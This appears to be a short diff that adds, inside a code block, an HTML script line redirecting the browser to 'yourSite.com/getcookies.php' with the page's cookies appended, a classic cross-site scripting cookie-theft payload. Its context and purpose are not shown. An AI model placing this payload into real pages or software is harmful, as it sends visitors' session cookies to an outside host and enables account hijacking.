@@ -1,3 +1,5 @@
 <pre><code class="php">
-
+<script>
+document.location = ''http://yourSite.com/getcookies.php?cookies='' + document.cookie;
+</script>
 </code></pre>
